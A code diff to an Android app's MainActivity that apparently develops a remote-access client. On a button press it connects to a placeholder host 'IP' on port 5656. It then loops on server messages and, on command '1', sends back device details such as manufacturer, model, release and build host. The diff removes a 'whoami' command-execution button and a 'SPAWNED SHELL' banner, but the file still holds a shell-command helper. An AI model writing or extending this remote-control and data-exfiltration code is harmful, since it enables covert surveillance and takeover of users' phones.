@@ -32,20 +32,6 @@ public class MainActivity extends AppCompatActivity {
         EdgeToEdge.enable(this);
         setContentView(R.layout.activity_main);
 
-        Button executeCmdBtn = findViewById(R.id.execute_cmd_btn);
-        executeCmdBtn.setOnClickListener(view -> {
-            executorService.execute(() -> {
-                try {
-                    String result = executeCommands("whoami");
-                    mainHandler.post(() -> {
-                        Log.i("cmd", "result: " + result);
-                    });
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-            });
-        });
-
         Button connectToHostBtn = findViewById(R.id.connect_btn);
         connectToHostBtn.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -56,7 +42,8 @@ public class MainActivity extends AppCompatActivity {
                         try {
                             connection.startConnection("IP", 5656);
                             Log.i("Connection", "Connection started");
-                            connection.sendFromClient("-------SPAWNED SHELL-------");
+                            String sendConnectionInfoToServer = connection.printConnetionInfo();
+                            connection.sendFromClient(sendConnectionInfoToServer);
                             while (true) {
                                 String msgReceivedFromServer = connection.receiveFromServer();
                                 Log.i("Received from the server", msgReceivedFromServer);
@@ -64,6 +51,9 @@ public class MainActivity extends AppCompatActivity {
                                     connection.sendFromClient("Bye!");
                                     connection.stopConnection();
                                     Log.i("Connection", "Connection closed");
+                                }
+                                if (msgReceivedFromServer.equals("1")) {
+                                    connection.sendFromClient(deviceInfo());
                                 }
                             }
                         } catch (Exception e) {
@@ -92,5 +82,18 @@ public class MainActivity extends AppCompatActivity {
         }
         reader.close();
         return output.toString();
+    }
+
+    public String deviceInfo() {
+        String line = "────୨ৎ────────୨ৎ────────୨ৎ────────୨ৎ────\n";
+        line += "Manufacturer: "+android.os.Build.MANUFACTURER+"\n";
+        line += "Version/Release: "+android.os.Build.VERSION.RELEASE+"\n";
+        line += "Product: "+android.os.Build.PRODUCT+"\n";
+        line += "Model: "+android.os.Build.MODEL+"\n";
+        line += "Brand: "+android.os.Build.BRAND+"\n";
+        line += "Device: "+android.os.Build.DEVICE+"\n";
+        line += "Host: "+android.os.Build.HOST+"\n";
+        line += "────୨ৎ────────୨ৎ────────୨ৎ────────୨ৎ────\n";
+        return line;
     }
 }
